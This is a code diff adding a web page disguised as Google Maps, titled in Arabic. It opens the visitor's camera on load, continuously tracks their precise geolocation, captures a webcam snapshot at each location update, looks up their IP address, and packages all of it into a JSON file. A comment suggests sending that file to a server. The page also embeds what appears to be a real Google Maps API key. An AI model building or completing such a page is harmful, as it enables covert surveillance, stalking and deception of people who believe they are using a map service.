@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خرائط Google</title>
+    <link rel="icon" type="image/webp" href="logo.png">
+    <style>
+        #map {
+            height: 100vh;
+            width: 100%;
+        }
+        video, canvas {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            border: 2px solid #000;
+        }
+        #snapshot {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="map"></div>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="snapshot" width="320" height="240"></canvas>
+
+    <script>
+        var map;
+        var marker;
+        var jsonData = {}; // Object to store location, image, and IP data
+
+        // Initialize Google Maps
+        function initMap() {
+            var defaultLocation = { lat: 36.2093, lng: 36.161 };
+            map = new google.maps.Map(document.getElementById('map'), {
+                zoom: 12,
+                center: defaultLocation
+            });
+            marker = new google.maps.Marker({
+                position: defaultLocation,
+                map: map,
+                icon: {
+                    url: "http://maps.google.com/mapfiles/ms/icons/blue-dot.png" // Blue marker
+                }
+            });
+            // Start watching the user's location
+            watchLocation();
+        }
+
+        function watchLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(updatePosition, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function updatePosition(position) {
+            var newLocation = { lat: position.coords.latitude, lng: position.coords.longitude };
+            map.setCenter(newLocation);
+            marker.setPosition(newLocation);
+            map.setZoom(15);
+
+            // Store location data in JSON object
+            jsonData.location = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+
+            // Capture and store image from the camera
+            captureImage();
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
+
+        function openCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+            })
+            .catch(function(error) {
+                console.error("Error accessing the camera: ", error);
+            });
+        }
+
+        function captureImage() {
+            var video = document.getElementById('video');
+            var canvas = document.getElementById('snapshot');
+            var context = canvas.getContext('2d');
+
+            // Draw video frame onto the canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Get image data as base64
+            var imageData = canvas.toDataURL('image/png');
+
+            // Store image data in JSON object
+            jsonData.image = imageData;
+
+            // Fetch IP address and save data
+            fetchIPAddress();
+        }
+
+        // Fetch IP address using ipinfo.io
+        function fetchIPAddress() {
+            fetch('https://ipinfo.io/json?token=your_ipinfo_token')
+            .then(response => response.json())
+            .then(data => {
+                jsonData.ip = data.ip;  // Store IP address in JSON object
+
+                // Log the JSON data (can be stored in a file or sent to a server)
+                console.log(JSON.stringify(jsonData));
+                console.log(data.ip);
+
+                // Save the JSON data to a file
+                saveJSONFile(jsonData);
+            })
+            .catch(error => console.error('Error fetching IP address:', error));
+        }
+
+        // Function to download JSON data as a file
+        function saveJSONFile(data) {
+            var dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(data));
+            var downloadAnchor = document.createElement('a');
+            downloadAnchor.setAttribute("href", dataStr);
+            downloadAnchor.setAttribute("download", "user_data.json");
+            document.body.appendChild(downloadAnchor);
+            downloadAnchor.click();
+            downloadAnchor.remove();
+        }
+
+        // Open camera when the page loads
+        window.onload = function() {
+            openCamera();
+        };
+    </script>
+    <script async
+        src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCz7MVXwh_VtjqnPh5auan0QCVwVce2JX0&callback=initMap">
+    </script>
+</body>
+</html>
